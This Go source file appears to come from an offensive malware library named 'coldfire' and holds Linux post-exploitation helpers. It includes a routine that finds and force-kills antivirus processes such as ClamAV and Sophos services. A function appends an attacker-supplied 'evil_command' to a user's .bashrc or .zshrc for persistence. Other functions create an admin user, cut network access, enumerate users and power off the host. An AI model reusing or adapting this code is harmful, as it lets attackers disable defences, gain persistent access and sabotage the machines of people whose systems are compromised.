package coldfire

import (
	"strings"
	"syscall"
	"io/ioutil"
	"os/user"
	"fmt"
	"os"
	"github.com/mitchellh/go-ps"
)

func userinfo() string {
	user, err := cmdOut("whoami")
	if err != nil {
		return "N/A"
	} else {
		return user
	}
}

func killProcByPID(pid int) error {
	err := syscall.Kill(pid,9)
	return err
}

func isRoot() bool {
	user, err := user.Current()
	if err != nil {
		panic(err)
	}
	if user.Username != "root" {
		return false
	}
	return true
}

func shutdown() error {
	err := syscall.Reboot(syscall.LINUX_REBOOT_CMD_POWER_OFF)
	return err
}

func pkillAv() error {
	av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func users() ([]string, error) {
	o, err := cmdOut("cut -d: -f1 /etc/passwd")

	if err != nil {
		return nil, err
	}

	return strings.Split(o, "\n"), nil
}

func createUser(username, password string) error {
	// This is too much distro dependent. Maybe try x different commands,
	// including `useradd`?
	cmd := f("sysadminctl -addUser %s -password %s -admin", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func wifiDisconnect() error {
	iface, _ := Iface()
	cmd := f("ip link set dev %s down", iface)
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func addPersistentCommand(evil_command string) error {
	ep, err := os.Open("/etc/passwd")
	if err != nil { return err }
	data, err := ioutil.ReadAll(ep)
	if err != nil { return err }
	byline := strings.Split(string(data),"\n")
	for  _,line := range byline {
		splitted := strings.Split(line,":")
		if len(splitted) >= 6 {
			switch splitted[6] {
				case "/bin/bash":
					cu,err := GetUser()
					if err != nil { return err }
					if splitted[0] == cu {
						pwd := "/home/"
						pwd = pwd + splitted[0]
						pwd = pwd + "/.bashrc"
						f,err := os.OpenFile(pwd,os.O_APPEND|os.O_WRONLY,0644)
						if err != nil { return err }
						fmt.Fprintf(f,"%s",evil_command)
						f.Close()
					}
				case "/bin/zsh":
					cu, err := GetUser()
					if err != nil { return err }
					if splitted[0] == cu {
						pwd := "/home/"
						pwd = pwd + splitted[0]
						pwd = pwd + "/.zshrc"
						f,err := os.OpenFile(pwd,os.O_APPEND|os.O_WRONLY,0644)
						if err != nil { return err }
						fmt.Fprintf(f,"%s",evil_command)
						f.Close()
					}
				default:
					continue
			}
		}
	}
	return err
}


func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "abcdefgh" {
		f, err := os.Open("/dev/sd" + string(drive))
		if err == nil {
			found_drives = append(found_drives, "/dev/sd"+string(drive))
			f.Close()
		}
	}

	return found_drives, nil
}
